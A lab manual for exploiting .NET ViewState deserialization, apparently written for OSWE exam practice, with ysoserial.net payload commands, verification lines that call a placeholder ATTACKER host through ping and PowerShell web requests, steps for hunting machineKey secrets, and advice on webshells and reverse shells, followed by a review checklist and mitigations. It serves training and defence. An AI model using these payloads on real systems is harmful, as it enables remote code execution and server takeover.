## Docker lab

Preferred setup: `cd labs && ./labctl.sh up` (see [`lab/README.md`](lab/README.md) and [`labs/README.md`](../../labs/README.md)).

---

# .NET ViewState Deserialization — Lab Manual

## Vulnerability summary

| Item | Detail |
|------|--------|
| Target class | ASP.NET apps with **ViewState** (and related LosFormatter/ObjectStateFormatter use) |
| Type | Insecure deserialization → RCE |
| Typical requirement | Knowledge of **machineKey** (validation + decryption) or disabled MAC |
| Impact | RCE as IIS app pool identity |
| PoC | `poc.py` |
| Guides | `guides/DotNet-Deserialization-Guide.md` |
| Sibling case | `notes/DOTNETNUKE-COOKIE-DESERIALIZATION.md` |

---

## Key concepts

### What ViewState is

ASP.NET serializes page state into a hidden field `__VIEWSTATE` (and sometimes `__VIEWSTATEGENERATOR`). Browsers round-trip it on postbacks. The blob is often:

```text
Base64( MAC( optional Encrypt( serialized state ) ) )
```

If an attacker can craft a **valid** MAC (knows keys) or MAC is off, they can supply a serialized gadget graph that executes on deserialize.

### Magic / fingerprints

- Hidden input `id="__VIEWSTATE"`
- Base64 often starts with `/wEP` for common encodings
- `web.config` → `<machineKey validationKey=... decryptionKey=... validation=... decryption=... />`

### Gadget mindset

**ysoserial.net** builds object graphs (e.g. **ObjectDataProvider**) whose property access runs attackers' commands during deserialization.

---

## Attack chain

```text
1. Confirm ASP.NET + ViewState
2. Obtain machineKey (config disclosure, source, backup, misconfig)
3. Generate payload with ysoserial.net (correct algs)
4. POST payload as __VIEWSTATE to a page that processes ViewState
5. Verify OOB → reverse shell / webshell
```

---

## Lab setup

### Options

1. **Vulnerable custom ASP.NET page** with known machineKey in `web.config`
2. **Historical CMS** lab (e.g. older DNN builds) with documented issues
3. **Pwnworks** .NET deserial challenges (README Practice Labs)

### Minimal web.config fragment (lab only)

```xml
<system.web>
  <machineKey
    validationKey="YOUR_VALIDATION_KEY_HEX"
    decryptionKey="YOUR_DECRYPTION_KEY_HEX"
    validation="SHA1"
    decryption="AES" />
  <pages enableViewStateMac="true" viewStateEncryptionMode="Always" />
</system.web>
```

Even with MAC **on**, **known keys** = forgeable ViewState.

### Tools on attacker

```text
ysoserial.net (Windows or wine/mono as applicable)
Python 3 + requests (this PoC)
Burp Suite
Optional: dnSpy for source review
```

---

## ysoserial.net workflow

### Generate ViewState payload

```text
ysoserial.exe -p ViewState -g ObjectDataProvider -c "cmd /c ping -n 3 ATTACKER" ^
  --validationkey=HEX --validationalg=SHA1 ^
  --decryptionkey=HEX --decryptionalg=AES
```

Adjust algorithms to match `web.config` exactly (`HMACSHA256`, etc.).

### Other formatters (non-ViewState apps)

```text
ysoserial.exe -g ObjectDataProvider -f BinaryFormatter -c "whoami"
ysoserial.exe -g ObjectDataProvider -f LosFormatter -c "whoami"
```

### Verification commands

| Goal | Example command inside `-c` |
|------|------------------------------|
| ICMP | `ping -n 4 ATTACKER` |
| HTTP | `powershell -c iwr http://ATTACKER/` |
| Shell | PowerShell reverse one-liner (lab) |

---

## Manual walkthrough

### 1. Collect ViewState sample

Browse a `.aspx` page → view source → copy `__VIEWSTATE` and any generator fields.

### 2. Find keys

Priority order:
1. `web.config` in web root / parent apps
2. Source repo / deploy scripts
3. Backup files (`web.config.bak`)
4. Historical default keys (rare; don't rely)

### 3. Generate & POST

Burp: intercept postback, replace `__VIEWSTATE`, forward.  
Or Python PoC with session + VIEWSTATEGENERATOR if required.

### 4. Confirm

Listener / tcpdump / weblogs on attacker callback.

### 5. Escalate reliability

- Write ASPX webshell under app directory if permissions allow
- Or stable reverse shell

---

## Using this PoC

```bash
python3 poc.py --help
python3 poc.py 192.168.1.10 80 10.10.14.5 4444 \
  --machine-key <VALIDATION> --validation-key <...>
```

(Exact flags: read `poc.py` argparse — names may be `machine-key` / validation vs decryption split.)

Stages should: fetch page → generate/embed payload → post → verify.

---

## Code review checklist (.NET)

- [ ] `BinaryFormatter`, `ObjectStateFormatter`, `LosFormatter`, `NetDataContractSerializer`
- [ ] `JavaScriptSerializer` with simple type resolvers / weak configs
- [ ] JSON.NET `TypeNameHandling.Auto` / `All`
- [ ] `enableViewStateMac="false"`
- [ ] Hard-coded `machineKey`
- [ ] Cookie deserial (DNN-style personalization)

---

## Common failures

| Symptom | Likely cause |
|---------|----------------|
| Silent fail | Wrong validation/decryption alg or key |
| ViewState MAC failed error | Key mismatch or truncated key |
| Payload executes only on postback | Need event that loads ViewState |
| No egress | Use in-band file write if filesystem writable |
| Cookie path works, ViewState doesn't | Different code path — switch channel |

---

## OSWE exam notes

- **First 10 minutes on ASP.NET**: grab `web.config` paths + ViewState presence.
- Match **algorithm suite** pedantically; one wrong enum wastes an hour.
- ObjectDataProvider understanding > memorizing one CLI line.
- Script generation: call ysoserial via subprocess like Java Commons PoC does for ysoserial.jar.
- Report machineKey **handling** carefully per exam rules (don't leak unrelated secrets outside scope).

### Time model

| Step | Budget |
|------|--------|
| Identify ViewState + config | 10–15 min |
| First successful ping payload | 15–25 min |
| Shell + PoC | 30–60 min |

---

## Mitigation

1. Unique strong machineKeys per app; never commit secrets.
2. Keep ViewState MAC enabled; encrypt when needed.
3. Eliminate `BinaryFormatter` and unsafe type-handling JSON.
4. Patch frameworks/CMS; reduce gadget-bearing packages.
5. App pool least privilege; disable unused handlers.

---

## References

- ysoserial.net — https://github.com/pwntester/ysoserial.net
- Black Hat: Friday the 13th JSON Attacks (Muñoz et al.)
- `guides/DotNet-Deserialization-Guide.md`
- `notes/DOTNET-VIEWSTATE-DESERIALIZATION.md`
- Pwnworks .NET challenges (README)
